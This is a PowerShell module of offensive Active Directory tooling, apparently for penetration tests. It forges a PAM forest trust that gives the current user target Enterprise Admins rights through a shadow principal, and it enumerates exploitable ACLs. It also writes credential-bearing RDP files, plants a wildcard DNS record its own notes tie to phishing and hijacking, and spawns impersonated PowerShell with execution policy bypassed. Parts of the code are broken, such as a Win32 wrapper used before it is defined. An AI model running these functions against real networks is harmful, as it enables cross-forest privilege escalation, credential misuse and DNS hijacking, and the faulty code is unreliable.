<#
.SYNOPSIS
Adds a DNS conditional forwarder for a target domain.

.DESCRIPTION
Creates a DNS conditional forwarder zone pointing to the specified IP address for the given domain.
If the zone already exists, the function returns without modification.

.PARAMETER TargetDomain
The fully qualified domain name (FQDN) to create a forwarder for.

.PARAMETER TargetIP
The IP address of the DNS server to forward queries to.

.EXAMPLE
Add-TargetDnsForwarder -TargetDomain "corp.example.com" -TargetIP "192.168.1.53"
Adds a DNS forwarder for corp.example.com pointing to 192.168.1.53.

.NOTES
This function requires DNS administrative privileges.
Useful for establishing DNS resolution for trust relationships between forests.

.INPUTS
System.String
Accepts domain name and IP address as strings.

.OUTPUTS
None or Microsoft.Management.Infrastructure.CimInstance if the forwarder is created.
#>
function Add-TargetDnsForwarder {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDomain,
        [Parameter(Mandatory=$true)]
        [string]$TargetIP
    )

    $zone = try { Get-DnsServerZone -Name $TargetDomain -ErrorAction SilentlyContinue } catch { }

    if ($null -eq $zone) {
        Add-DnsServerConditionalForwarderZone -Name $TargetDomain -MasterServers $TargetIP -PassThru
    }
}

<#
.SYNOPSIS
Establishes a one-way PAM trust relationship between two Active Directory forests.

.DESCRIPTION
Creates a reverse bastion trust (also known as a PAM trust) between the current forest and a target forest.
Configures DNS forwarders, enables PAM features, and creates shadow principals for cross-forest authentication.
Supports both password-based and Pass-The-Ticket authentication methods.

.PARAMETER TargetDomain
The fully qualified domain name (FQDN) of the target forest.

.PARAMETER TargetDC
The hostname or FQDN of a domain controller in the target forest.

.PARAMETER Credential
PSCredential object containing credentials for authentication to the target domain.
Used with the PasswordAuth parameter set.

.PARAMETER CurrentIP
The IP address of the current domain's DNS server.

.PARAMETER TargetIP
The IP address of the target domain's DNS server.

.PARAMETER PTT
Indicates Pass-The-Ticket authentication should be used instead of password authentication.

.PARAMETER TrustPassword
The trust password to use when establishing the trust relationship.
Required when using Pass-The-Ticket authentication.

.EXAMPLE
$cred = Get-Credential
Invoke-ReverseBastion -TargetDomain "target.example.com" -TargetDC "DC01.target.example.com" `
    -Credential $cred -CurrentIP "192.168.1.53" -TargetIP "192.168.2.53"
Establishes a reverse bastion trust with password-based authentication.

.EXAMPLE
Invoke-ReverseBastion -TargetDomain "target.example.com" -TargetDC "DC01.target.example.com" `
    -CurrentIP "192.168.1.53" -TargetIP "192.168.2.53" -PTT -TrustPassword "MyTrustPassword123!"
Establishes a reverse bastion trust using Pass-The-Ticket authentication.

.NOTES
Requires Domain Admin privileges in the current forest.
Suppresses PSAvoidUsingPlainTextForPassword warning as plaintext is only used for trust creation.
Automatically enables the PAM feature if not already enabled.
Creates and configures shadow principals for cross-forest access.

.INPUTS
System.String, System.Management.Automation.PSCredential, System.Management.Automation.SwitchParameter

.OUTPUTS
None. Function modifies AD configuration directly.
#>
function Invoke-ReverseBastion {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]

    # Unfortunately, `CreateLocalSideOfTrustRelationship()` and `UpdateLocalSideOfTrustRelationship()`
    # [don't allow for passing a secure string](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectory.forest.createtrustrelationship?view=windowsdesktop-11.0),
    # so we have to suppress the warning about using plaintext passwords here.
    # The password is only used for the trust relationship and isn't stored anywhere, so this is an acceptable risk in this context.
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDomain,
        [Parameter(Mandatory=$true)]
        [string]$TargetDC,
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)] 
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory=$true)]
        [string]$CurrentIP,
        [Parameter(Mandatory=$true)]
        [string]$TargetIP,
        [Parameter(ParameterSetName="PassTheTicket")]
        [switch]$PTT,
        [Parameter(ParameterSetName="PassTheTicket", Mandatory=$true)]
        [string]$TrustPassword
    )

    Import-Module ActiveDirectory
    [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.ActiveDirectory")

    $CurrentDomain = $Env:USERDNSDOMAIN

    $feature = Get-ADOptionalFeature -Identity 'Privileged Access Management Feature'
    $scopes = $feature.EnabledScopes

    if ([string]$scopes -eq '') {
        Enable-ADOptionalFeature -Identity 'Privileged Access Management Feature' -Scope ForestOrConfigurationSet -Target $CurrentDomain
    }
    
    try {
        Resolve-DnsName -Name $TargetDomain
    } catch {
        Add-DnsServerConditionalForwarderZone -Name $TargetDomain -MasterServers $TargetIP -PassThru
    }
    
    if ($PTT) {
        Invoke-Command -ComputerName $TargetDC -ScriptBlock {
            Add-DnsServerConditionalForwarderZone -Name $using:CurrentDomain -MasterServers $using:CurrentIP -PassThru
        }
    } else {
        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock {
            Add-DnsServerConditionalForwarderZone -Name $using:CurrentDomain -MasterServers $using:CurrentIP -PassThru
        }
    }

    $targetSid = if ($PTT) {
        (Get-ADGroup -Identity 'Enterprise Admins' -Server $TargetDC).SID.Value
    } else {
        (Get-ADGroup -Identity 'Enterprise Admins' -Server $TargetDC -Credential $Credential).SID.Value
    }

    $trustpass = if ($PTT) {
        $TrustPassword
    } else {
        $Credential.GetNetworkCredential().Password
    }

    $block = {
        param(
            [string]$BastionDomain,
            [string]$TrustPassword
        )
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.ActiveDirectory")

        try {
            [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateLocalSideOfTrustRelationship(
                $BastionDomain,
                [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
                $TrustPassword
            )
        } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
            Write-Host "Local side of trust relationship already exists; updating instead of creating anew"
            [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().UpdateLocalSideOfTrustRelationship(
                $BastionDomain,
                [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
                $TrustPassword
            )
        }

        netdom trust $BastionDomain /ForestTransitive:yes
        netdom trust $BastionDomain /EnableSIDHistory:yes
        netdom trust $BastionDomain /EnablePIMTrust:yes
        netdom trust $BastionDomain /Verify
    }

    try {
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateTrustRelationship(
            $TargetDomain,
            [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound
        )
    } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
        Write-Host "Trust relationship already exists; skipping creation"
    }

    try {
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateLocalSideOfTrustRelationship(
            $TargetDomain,
            [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound,
            $trustpass
        )
    } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
        Write-Host "Local side of trust relationship already exists; updating instead of creating anew"
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().UpdateLocalSideOfTrustRelationship(
            $TargetDomain,
            [System.DirectoryServices.ActiveDirectory.TrustDirection]::Inbound,
            $trustpass
        )
    }

    if ($PTT) {
        Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TrustPassword $trustpass"
    } else {
        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TrustPassword $trustpass"
    }

    $shadowcontainer = "CN=Shadow Principal Configuration,CN=Services,$((Get-ADRootDSE).ConfigurationNamingContext)"

    $targetnbname = if ($PTT) {
        (Get-ADDomain -Server $TargetDC).NetBIOSName
    } else {
        (Get-ADDomain -Server $TargetDC -Credential $Credential).NetBIOSName
    }

    $targetgroupname = $targetnbname + '-Enterprise-Admins'

    New-ADObject -Type 'msDS-ShadowPrincipal' -Name $targetgroupname -Path $shadowcontainer -OtherAttributes @{'msDS-ShadowPrincipalSid'="$targetSid"}
    Set-ADObject -Identity "CN=$targetgroupname,$shadowcontainer" -Add @{'member'="$((Get-ADUser -Identity $Env:USERNAME).DistinguishedName)"} -Verbose

    # Verify
    Get-ADObject -Identity "CN=$targetgroupname,$shadowcontainer" -Properties Member, msDS-ShadowPrincipalSid
}

<#
.SYNOPSIS
Identifies interesting ACLs on remote Active Directory objects.

.DESCRIPTION
Enumerates objects in a remote domain that are not Domain Admins or Domain Controllers,
then searches their group memberships for ACLs that grant dangerous permissions.
Dangerous permissions include GenericAll, Write*, Create*, Force-Change-Password, and Enroll rights.
Supports both password-based and Pass-The-Ticket authentication methods.

.PARAMETER Credential
PSCredential object containing credentials for authentication to the remote server.
Used with the PasswordAuth parameter set.

.PARAMETER ComputerName
The hostname, FQDN, or IP address of the remote domain controller.

.PARAMETER PTT
Indicates Pass-The-Ticket authentication should be used instead of password authentication.

.EXAMPLE
$cred = Get-Credential
Find-InterestingRemoteAcl -Credential $cred -ComputerName "dc01.target.example.com"
Finds interesting ACLs using password-based authentication.

.EXAMPLE
Find-InterestingRemoteAcl -ComputerName "dc01.target.example.com" -PTT
Finds interesting ACLs using Pass-The-Ticket authentication.

.NOTES
Requires appropriate permissions to enumerate Active Directory objects and ACLs on the remote server.
Creates a temporary PSDrive for the remote domain.
Results are formatted as lists showing objects with dangerous permissions.

.INPUTS
System.Management.Automation.PSCredential, System.String, System.Management.Automation.SwitchParameter

.OUTPUTS
Microsoft.ActiveDirectory.Management.ADObject with Access Control information.
#>
function Find-InterestingRemoteAcl {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]
    param(
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)] 
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory=$true)]
        [string]$ComputerName,
        [Parameter(ParameterSetName="PassTheTicket")]
        [switch]$PTT
    )

    if ($PTT) {
        $dom = (Get-ADDomain -Server $ComputerName).NetBIOSName
        New-PSDrive -Name $dom -PSProvider ActiveDirectory -Server $ComputerName -Root "//RootDSE/" -Scope Global

        $LDAPFilter = "(&"
        $LDAPFilter += "(|(objectClass=user)(objectClass=computer))"
        Get-ADGroup -LDAPFilter '(adminCount=1)' -Server $ComputerName | ForEach-Object {
            $LDAPFilter += "(!(memberof=$((Get-ADGroup -Identity $_ -Server $ComputerName).DistinguishedName)))"
        }
        Get-ADDomainController -Filter * -Server $ComputerName | ForEach-Object {
            $LDAPFilter += "(!(distinguishedName=$($_.ComputerObjectDN)))"
        }
        $LDAPFilter += '(!(sAMAccountName=krbtgt))'
        $LDAPFilter += ')'

        Get-ADObject -LDAPFilter $LDAPFilter -Server $ComputerName -Properties MemberOf | ForEach-Object {
            $user = $_
            $groups = Get-ADPrincipalGroupMembership -Identity $user -Server $ComputerName
            (Get-ADRootDSE -Server $ComputerName).NamingContexts | ForEach-Object {
                $nc = $_
                $groups | ForEach-Object {
                    $group = $_.Name
                    Get-ChildItem -Path ("$dom" + ":\$nc") -Recurse -Force | ForEach-Object {
                        Get-Acl -Path ("$dom" + ":\$_") | Select-Object PSChildName -ExpandProperty Access | Where-Object {
                            ($_.IdentityReference -eq "$dom\$user" -or $_.IdentityReference -eq "$dom\$group") -and `
                            $_.AccessControlType -eq "Allow" -and ( `
                                $_.ActiveDirectoryRights -eq "GenericAll" -or `
                                $_.ActiveDirectoryRights -like "*Write*" -or `
                                $_.ActiveDirectoryRights -like "*Create*" -or `
                                $_.ActiveDirectoryRights -like '*Force-Change-Password*' -or `
                                $_.ActiveDirectoryRights -eq "Enroll"
                            )
                        }
                    }
                }
            }
        } | Format-List

        Remove-PSDrive -Name $dom
    } else {
        $dom = (Get-ADDomain -Server $ComputerName -Credential $Credential).NetBIOSName
        New-PSDrive -Name $dom -PSProvider ActiveDirectory -Server $ComputerName -Root "//RootDSE/" -Credential $Credential -Scope Global

        $LDAPFilter = "(&"
        $LDAPFilter += "(|(objectClass=user)(objectClass=computer))"
        Get-ADGroup -LDAPFilter '(adminCount=1)' -Server $ComputerName -Credential $Credential | ForEach-Object {
            $LDAPFilter += "(!(memberof=$((Get-ADGroup -Identity $_ -Server $ComputerName -Credential $Credential).DistinguishedName)))"
        }
        Get-ADDomainController -Filter * -Server $ComputerName -Credential $Credential | ForEach-Object {
            $LDAPFilter += "(!(distinguishedName=$($_.ComputerObjectDN)))"
        }
        $LDAPFilter += '(!(sAMAccountName=krbtgt))'
        $LDAPFilter += ')'

        Get-ADObject -LDAPFilter $LDAPFilter -Server $ComputerName -Credential $Credential -Properties MemberOf | ForEach-Object {
            $user = $_
            $groups = Get-ADPrincipalGroupMembership -Identity $user -Server $ComputerName -Credential $Credential
            (Get-ADRootDSE -Server $ComputerName -Credential $Credential).NamingContexts | ForEach-Object {
                $nc = $_
                $groups | ForEach-Object {
                    $group = $_.Name
                    Get-ChildItem -Path ("$dom" + ":\$nc") -Recurse -Force | ForEach-Object {
                        Get-Acl -Path ("$dom" + ":\$_") | Select-Object PSChildName -ExpandProperty Access | Where-Object {
                            ($_.IdentityReference -eq "$dom\$user" -or $_.IdentityReference -eq "$dom\$group") -and `
                            $_.AccessControlType -eq "Allow" -and ( `
                                $_.ActiveDirectoryRights -eq "GenericAll" -or `
                                $_.ActiveDirectoryRights -like "*Write*" -or `
                                $_.ActiveDirectoryRights -like "*Create*" -or `
                                $_.ActiveDirectoryRights -like '*Force-Change-Password*' -or `
                                $_.ActiveDirectoryRights -eq "Enroll"
                            )
                        }
                    }
                }
            }
        } | Format-List

        Remove-PSDrive -Name $dom
    }
}

<#
.SYNOPSIS
Generates an RDP connection file with embedded credentials.

.DESCRIPTION
Creates a Remote Desktop Protocol (RDP) file configured with specified connection parameters,
resolution settings, and encrypted credentials for automated connection.
Attempts to map a network drive from the RDP session if available.

.PARAMETER User
The username for RDP authentication, typically in domain\username format.

.PARAMETER Password
The plaintext password for RDP authentication.

.PARAMETER IP
The IP address or hostname of the remote RDP server.

.PARAMETER FileName
The output filename for the RDP file (without extension, .rdp will be added).

.PARAMETER Width
The desktop width in pixels. Default is 2880.

.PARAMETER Height
The desktop height in pixels. Default is 1620.

.PARAMETER Port
The RDP port on the remote server. Default is 3389.

.PARAMETER FullScreen
If specified, the RDP session will start in fullscreen mode.

.EXAMPLE
Gen-RDPFile -User "CORP\Administrator" -Password "P@ssw0rd!" -IP "192.168.1.10" -FileName "admin_session"
Creates an RDP file named "admin_session.rdp" at the default resolution.

.EXAMPLE
Gen-RDPFile -User "CORP\Administrator" -Password "P@ssw0rd!" -IP "192.168.1.10" `
    -FileName "admin_session" -Width 1920 -Height 1080 -FullScreen
Creates a fullscreen RDP file at 1920x1080 resolution.

.NOTES
Uses approved verb suppression (Gen is not approved) for backward compatibility.
Credentials are encrypted in the RDP file using SecureString conversion.
WARNING: This function stores credentials. Use only in trusted environments.
Output file is created in the current working directory.

.INPUTS
System.String, System.Int32, System.Management.Automation.SwitchParameter

.OUTPUTS
System.IO.FileInfo for the created RDP file.
#>
function Gen-RDPFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '', Scope='Function')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    Param (
        [string]$User,
        [string]$Password,
        [string]$IP,
        [string]$FileName,
        [int]$Width = 2880,
        [int]$Height = 1620,
        [int]$Port = 3389,
        [switch]$FullScreen
    )

    $enc = ConvertTo-SecureString $Password -AsPlainText -Force | ConvertFrom-SecureString

    $screenMode = if ($FullScreen) {
        2
    } else {
        1
    }

    if ($(Test-Path -Path '\\tsclient\c')) {
        net use E: '\\tsclient\c'
    } elseif ($(Test-Path -Path '\\tsclient\e')) {
        net use E: '\\tsclient\e'
    }

    $fileContents = @"
screen mode id:i:$screenMode
use multimon:i:0
desktopwidth:i:$Width
desktopheight:i:$Height
session bpp:i:32
winposstr:s:0,1,465,143,3363,1810
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:${IP}:${Port}
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectclipboard:i:1
redirectposdevices:i:0
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
remoteappmousemoveinject:i:1
redirectlocation:i:0
redirectwebauthn:i:1
enablerdsaadauth:i:0
drivestoredirect:s:*
username:s:$User
password 51:b:$enc
"@;

    $fileContents | Out-File -FilePath $PWD\$FileName.rdp -Force
}

<#
.SYNOPSIS
Adds a wildcard DNS A record on a remote DNS server.

.DESCRIPTION
Creates a wildcard DNS A record (*) in the local domain's DNS zone on a remote domain controller.
All queries to *.localdomain will be resolved to the specified LocalIP address.

.PARAMETER TargetDC
The hostname or FQDN of the remote domain controller running DNS.

.PARAMETER LocalIP
The IP address that wildcard DNS queries should resolve to.

.EXAMPLE
Add-RemoteDnsWildcardRecord -TargetDC "dc01.example.com" -LocalIP "192.168.1.10"
Adds a wildcard DNS record on dc01.example.com pointing to 192.168.1.10.

.NOTES
Requires DNS administrative privileges on the target domain controller.
Uses the current user's domain (from $Env:USERDNSDOMAIN) as the target zone.
Useful for redirecting all subdomains in a zone for phishing or DNS hijacking.

.INPUTS
System.String

.OUTPUTS
Microsoft.Management.Infrastructure.CimInstance representing the created DNS record.
#>
function Add-RemoteDnsWildcardRecord {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetDC,
        [Parameter(Mandatory=$true)]
        [string]$LocalIP
    )

    $ZoneName = $Env:USERDNSDOMAIN
    Add-DnsServerResourceRecordA -Name '*' -ZoneName $ZoneName -IPv4Address $LocalIP -ComputerName $TargetDC -ErrorAction Stop
}

<#
.SYNOPSIS
Establishes an interactive WinRM session using plaintext credentials.

.DESCRIPTION
Creates and enters an interactive PowerShell Remoting session to a remote computer
using provided username and password credentials.

.PARAMETER TargetComputer
The hostname, FQDN, or IP address of the remote computer.

.PARAMETER Username
The username for authentication, in domain\username or username@domain format.

.PARAMETER Password
The plaintext password for authentication.

.EXAMPLE
Enter-PlaintextWinRMSession -TargetComputer "server.example.com" -Username "CORP\Administrator" -Password "P@ssw0rd!"
Establishes an interactive session to server.example.com.

.NOTES
Requires WinRM to be enabled and accessible on the target computer.
WARNING: Credentials are passed in plaintext. Use only in trusted environments or test scenarios.
The session remains open until the user exits (using 'Exit-PSSession' or 'exit').

.INPUTS
System.String

.OUTPUTS
None. Enters interactive session mode.
#>
function Enter-PlaintextWinRMSession {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$TargetComputer,
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [Parameter(Mandatory=$true)]
        [string]$Password
    )
    $pass = ConvertTo-SecureString $Password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ($Username, $pass)

    Enter-PSSession -ComputerName $TargetComputer -Credential $cred
}

<#
.SYNOPSIS
Creates a PowerShell session with the Active Directory module pre-loaded.

.DESCRIPTION
Establishes a PowerShell Remoting session with credentials and automatically loads the Active Directory module
for use in the remote session by loading the module assembly locally and passing it to the remote session via the `$Using` scope.
Can be used in interactive or non-interactive mode.

.PARAMETER User
The username for authentication, typically in domain\username format.
Used with the PasswordAuth parameter set.

.PARAMETER Password
The plaintext password for authentication.
Used with the PasswordAuth parameter set.

.PARAMETER ComputerName
The hostname, FQDN, or IP address of the remote computer.

.PARAMETER Interactive
If $true, enters interactive session mode. If $false, returns the session object for use in scripts.
Default is $true.

.PARAMETER PTT
Indicates Pass-The-Ticket authentication should be used instead of password authentication.

.EXAMPLE
Invoke-PSADSession -User "CORP\Administrator" -Password "P@ssw0rd!" -ComputerName "dc01.example.com"
Creates an interactive session with the AD module loaded.

.EXAMPLE
$session = Invoke-PSADSession -User "CORP\Administrator" -Password "P@ssw0rd!" `
    -ComputerName "dc01.example.com" -Interactive $false
Creates a non-interactive session object for programmatic use.

.EXAMPLE
Invoke-PSADSession -ComputerName "dc01.example.com" -PTT
Creates an interactive session using Pass-The-Ticket authentication.

.NOTES
Requires WinRM to be enabled on the target computer.
The Active Directory module assembly is dynamically loaded into the remote session.
Useful for executing AD commands on systems where the module is not installed.

.INPUTS
System.String, System.Boolean, System.Management.Automation.SwitchParameter

.OUTPUTS
System.Management.Automation.Runspaces.PSSession when Interactive is $false.
None when Interactive is $true (enters interactive mode).
#>
function Invoke-PSADSession {
    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]
    
    # Because this will really only be used on an offensive DC from which a penetration test of another domain is being conducted, this is no different from what e.g. NetExec does
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '', Scope='Function')]
    param(
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)] 
        [string]$User,
        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)]
        [string]$Password,
        [Parameter(Mandatory=$true)]
        [string]$ComputerName,
        [bool]$Interactive = $true,
        [Parameter(ParameterSetName="PassTheTicket")]
        [switch]$PTT
    )

    $ADModule = Get-Module -Name ActiveDirectory
    $ADModuleAssemblyPath = $ADModule.NestedModules[0].Path

    $ADAssemblyType = [System.Reflection.Assembly]::LoadFile($ADModuleAssemblyPath)

    $s = if ($PTT) {
        New-PSSession -ComputerName $ComputerName
    } else {
        $ss = ConvertTo-SecureString $Password -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential($User, $ss)

        New-PSSession -ComputerName $ComputerName -Credential $cred
    }

    Invoke-Command -Session $s -ScriptBlock {
        Import-Module -Assembly $Using:ADAssemblyType -Global
    }

    if ($Interactive) {
        Enter-PSSession $s
    } else {
        return $s
    }
}

<#
.SYNOPSIS
Impersonates a user and launches a new PowerShell process with their credentials.

.DESCRIPTION
Uses Win32 API calls to perform user impersonation via the LogonUser function.
Launches a new PowerShell process running as the specified user without fully switching
the user context (NetOnly authentication). Useful for accessing network resources with
different credentials while maintaining the current user's local session.

.PARAMETER Credential
PSCredential object containing the username and password to impersonate.

.EXAMPLE
$cred = Get-Credential "domain\username"
Invoke-PSNetOnly -Credential $cred
Launches a new PowerShell process impersonating the specified user.

.NOTES
Uses Win32 API: LogonUser with LOGON32_LOGON_NEW_CREDENTIALS (9).
Creates a background job to handle the impersonation.
The new PowerShell process inherits the impersonated user's network credentials.
WARNING: Requires proper error handling as LogonUser failures are reported but may not block execution.

.INPUTS
System.Management.Automation.PSCredential

.OUTPUTS
System.Management.Automation.Job for the background process.
#>
function Invoke-PSNetOnly {
    param(
        [Parameter(Mandatory=$true)]
        [System.Management.Automation.PSCredential]$Credential
    )

    $signature = @"
[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool CloseHandle(IntPtr hObject);
"@

    $token = [IntPtr]::Zero
    $success = $advapi32::LogonUser("$($Credential.UserName)", "$($Credential.GetNetworkCredential().Domain)", "$($Credential.GetNetworkCredential().Password)", 9, 0, [ref]$token)

    $block = {
        param(
            [IntPtr]$Token,
            [string]$TypeDefinition
        )
        $advapi32 = Add-Type -MemberDefinition $TypeDefinition -Name "Win32Logon" -Namespace "Win32" -PassThru

        $identity = New-Object System.Security.Principal.WindowsIdentity($Token)
        $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)

        [System.Threading.Thread]::CurrentPrincipal = $principal
        [System.Security.Principal.WindowsIdentity]::RunImpersonated($identity.AccessToken, {
            Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass"
        })

        $advapi32::CloseHandle($Token)
    }

    if ($success) {
        Start-Job -ScriptBlock $block -ArgumentList "-Token $token -TypeDefinition $signature"
    } else {
        Write-Error "LogonUser failed with error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
}
